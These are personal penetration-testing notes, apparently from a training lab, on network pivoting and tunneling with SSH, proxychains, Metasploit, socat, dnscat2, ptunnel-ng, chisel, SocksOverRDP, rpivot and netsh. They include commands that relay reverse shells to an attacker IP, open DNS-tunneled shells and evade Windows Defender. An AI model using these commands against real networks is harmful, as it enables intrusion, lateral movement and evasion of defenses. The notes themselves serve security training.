
# Network Interfaces

Each network interface has the address of your machine on that network and the netmask.
- `tun0` means tunneled network interface
- `netstat -r` will show your routing table and you can see what interface will be used for a particular IP address

### TCPDUMP

- `-i [interface]` listen on any interface (or, `-i any`)
- if you don't have` ifconfig`, use `ip a s`
- `-w [file]` saves results to a pcap file
- `-r [file]` read from a file
- `-c [number]` specify number of packets to capture
- `-e` will display link-level information (MAC, ARP)
- `tcpdump host [host]` to only capture traffic from a certain device on the network (destination host)
- `tcpdump src host [hostname or IP]` will filter for a specific traffic destination
	- also `src port` or `dst port`
- logical operators:
	- `and` 
	- `or`
	- `not`
	- ex. `tcpdump src host 1.1.1.1 and tcp`

### Netstat

- `-r` shows routing table
- `-n` shows numerical addresses rather than resolving
- `-a` shows all listening and non-listening sockets
- `-t` shows TCP connections
- `-p` shows connections specified by protocol
# Windows

Windows: `net view [target-IP]` to see what foothold machine can access on internal target
- If any shared resources, mount them with `net use D: \\[target]\[drive_name]`
- note that the `D:` can be any arbitrary drive letter that you make

`arp -a` in CMD will show discovered network devices


# Tunneling

`ss`
- shows sockets running on a host
- `-t` show TCP sockets
- `-u` show UDP sockets
- `-l` display listening sockets
- `-p` shows the process using the socket
- `-n` doesn't resolve service names
## SSH Tunnel

- `ssh -L [lport]:localhost:[rport] user@IP`
	- Both machines will encapsulate their traffic using ssh port 22
	- `lport` is the listening port on our machine that we want to receive the traffic to and send traffic from
	- `rport` is the port on the target machine that we want the traffic from
	- You can execute multiple of these in one command by repeating the `-L` flag with new arguments.
	- Ex. forwarding both MySQL and HTTP from target to our machine: `ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@IP` 
- To confirm the tunneling, `nmap -sV -p1234 localhost` 
- use `-N` to skip the shell if you're just port forwarding

### SOCKS Tunneling with SSH

`Sshuttle` is a Python tool that removes the need for proxychains.
- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`
	- This command routes traffic to the listed address range through the victim host connection.

- For pivoting from a foothold to an internal host
- `ssh -D 9050 user@IP`
	- `-D` enables dynamic port forwarding
- `/etc/proxychains.conf`
	- `#defaults set to "tor" \ socks4 127.0.0.1 9050`
- Now, running `proxychains [tool]` it will route all traffic to port 9050, where ssh is listening and forwarding through the foothold host
	- NOTE for nmap: You can only use **full TCP connect scans** with proxychains because it can't use partial packets.
	- May also need to disable ping probe
- Example tools to use over socks tunnel:
	- You can also start `proxychains msfconsole` to use metasploit over our tunnel
	- `proxychains xfreerdp`

#### With `metasploit`
- Once you have a meterpreter shell, `use auxiliary/server/socks_proxy`
	- set `srvport` to 9050 (from `proxychains.conf`)
	- set `srvhost` to 0.0.0.0
	- set version to same version from `proxychains.conf` (usually 4a)
	- `jobs` to verify it's running
- now use `post/multi/manage/autoroute` to route traffic through the meterpreter session
	- set `session` 
	- set `subnet` to internal subnet on pivot machine
- instead of the module you can also `run autoroute -s 172.16.5.0/23` from the meterpreter shell
	- `run autoroute -p` to verify the routing table is correct
- You can also portforward with the meterpreter session. If you want to learn that go visit the module again.


### Reverse Port Forward with SSH

- First, get the shell payload on the internal host. You can use `scp` to get it on the pivot host, and then another kind of transaction such as HTTP server to get it to the internal host.
	- Make sure your payload is set to connect to the **pivot hosts** IP and port.
- Configure ssh tunnel with `-R` to forward traffic from the internal IP address of the pivot host:
	- `ssh -R [internal_IP_of_foothold]:9999:0.0.0.0:8000 -vN`
	- In this case, our reverse shell is being caught on port `9999` of the foothold host, and it should be received by our listener on `8000`
	- When establishing the ssh tunnel, use `-vN` for verbosity and to not prompt the login shell.

#### Socat Redirection

- Reverse shell:
	- Once logged into target, you can use `socat` to create a pipe socket between 2 hosts.
	- `socat TCP4-LISTEN:8080,fork TCP4:[attacker_IP]:[listener_port]`
	- This will listen on the local port 8080 and forward back to our machine on the port of our choosing. This is good for pivoting if we have an internal machine that is communicating to the foothold host on port 8080.
- Bind shell:
	- same process, but have the foothold machine forward data to the `internal host` rather than `attacker machine`. 
	- On meterpreter, use something like `windows/x64/meterpreter/bind_tcp` and set `rhost [foothold_IP]` and `LPORT 8080`.
	- Since we set up the `socat` listener on 8080, the foothold will receive our bind_tcp payload and forward it to the internal host.

## DNS Tunnel

`Dnscat2` https://github.com/iagox86/dnscat2
- Tunnel that uses DNS protocol
- Installation
	- `sudo clone [github]`
	- `cd dnscat2/server/`
	- `sudo gem install bundler`
	- `sudo bundle install`
- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
- You will need to transfer the client to the host, or in the case of a Windows host use `dnscat2-powershell` https://github.com/lukebaggett/dnscat2-powershell
	- `Start-Dnscat2 -DNSserver [attacking_IP] -Domain inlanefreight.local -PreSharedSecret [key from dnscat2 server] -Exec cmd`
- dnscat2 prompt:
	- `?` list options
	- `window -i 1` drops into a shell

## ICMP Tunnel

- encapsulates traffic with ICPM packets containing echo requests and responses
- ptunnel-ng client and server tool (server on the pivot host)
- git clone https://github.com/utoni/ptunnel-ng.git
- install automake and autoconf
- sudo ./autogen.sh
- scp -r ptunnel-ng user@IP:~/
- on pivot host in /ptunnel-ng/src: sudo ./ptunnel-ng -r[pivot_IP] -R22
- Attack host: sudo ./ptunnel-ng -p[pivot_IP] -l2222 -r[pivot_IP] -R22
- Attack host: ssh -p2222 -l[user] 127.0.0.1

## Chisel/HTTP Tunnel

SOCKS5 Tunneling using HTTP. Useful to create a tunnel in a firewall restricted environment.
https://github.com/jpillora/chisel.git

- You need GO installed
- Build the binary `cd chisel && go build`
- IppSec has a walkthrough on shrinking the size of the binary for detection reasons, https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s 24:30
- Copy the binary to the host
	- on pivot host `./chisel server -v -p 1234 --socks5`
- On attacking machine
	- `./chisel client -v [IP:port of pivot host] socks`
	- modify `/etc/proxychains.conf` and add the line `socks5 127.0.0.1 1080` (assuming 1080 was the port from the output of running chisel)
	- now you can use proxychains to attack internal host

## RDP Tunnel

Useful for windows network with no ssh
`SocksOverRDP` is a Dynamic Virtual Channel (DVC)
Note, this example used Proxifier to RDP from a foothold to TWO internal hosts. We used the first internal host as the SocksOverRDP server, and then used Proxifier on the foothold to RDP to the second internal host.

Step 1: `SocksOverRDP`
- https://github.com/nccgroup/SocksOverRDP/releases
- Copy the appropriate ZIP using an RDP session
- Unzip and load the plugin with `regsvr32.exe SocksOverRDP-Plugin.dll`
	- had to add an exclusion for Windows Defender for the folder, otherwise it will delete it
	- It will listen on 127.0.0.1:1080
- `mstsc.exe` to RDP to internal host
	- Transfer `SocksOverRDP-Server.exe` to internal host (you can copy and paste)
- Start `SocksOverRDP-Server.exe` with admin privileges
- On foothold, `netstat -antb | findstr 1080` should show a connection on 1080
Step 2: `Proxifier`
- https://www.proxifier.com/download/#win-tab
- Transfer `Proxifier portable` to the Windows external target
- Click on the application to run it as GUI, and set the address to 127.0.0.1 and port to 1080 (might need to try a SOCKS4 or SOCK5 protocol)
- Start mstsc.exe (again) and Proxifier will route our traffic through 1080 to the RDP session on the internal target
	- I needed to run mstsc.exe from the file explorer rather than command line
- In RDP menu, try setting experience to `modem` if you have slow connetion

# Pivoting Around Obstacles


#### SSH Pivoting

- `Sshuttle` is a Python tool that removes the need for proxychains for ssh specifically.
- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`
	- This command routes traffic to the listed address range through the victim host connection.

#### Web Server Pivot
Does not work with Python3!

- `Rpivot` is a reverse SOCKS proxy tool that will let you connect to internal web server through an external pivot host.
	- `git clone https://github.com/klsecservices/rpivot.git`
- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
	- This will have the attack machine serve on port 9999 for the victim to connect to
- Transfer `rpivot` directory to web server victim with `scp`
- on victim server: `python2.7 client.py --server-ip [attacker-IP] --server-port 9999`
- Now use `proxychains firefox-esr [internal_IP]:80` to connect to the internal webserver.
	- You can add NTLM authentication if necessary for the internal server.
	- Add the following in addition to the arguments above: `--ntlm-proxy-ip` , `--ntlm-proxy-port` , `--domain` , `--username` , `--password` 

#### Windows Port Forward with Netsh
(sometimes requires command prompt to be run as administrator to use netsh)

- `Netsh` is a Windows tool that can do several network config tasks such as find routes, view firewall configs, add proxies, and create port forwarding rules. If we have a Windows pivot host, `Netsh` affords us these options for pivoting.
- Port forward: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[pivot_IP] connectport=3389 connectaddress=[internal_IP]`
- To verify forwarding: `netsh.exe interface portproxy show v4tov4`
- You can now connect to the Windows pivot host with the attacking machine and RDP to the internal host through the port we forwarded (`[pivot_IP]:8080`)

#### From a Windows Attack Host

- `plink.exe` is a PuTTY Link tool that acts as an ssh server for linux hosts. Before 2018, Windows did not have an ssh client and PuTTY was necessary.
- `plink -ssh -D 9050 hostname@IP_address`
	- This would be used from a Windows attack host to a victim Linux server.
	- It establishes local port 9050 for dynamic port forwarding through ssh on the linux target.
- `Proxifier` can be used to start a SOCKS tunnel via the ssh session from `plink`
	- Configure the SOCKS server for 127.0.0.1 and the port 9050 we used earlier. Start `mstsc.exe` to begin an RDP session with a Windows target that allows RDP.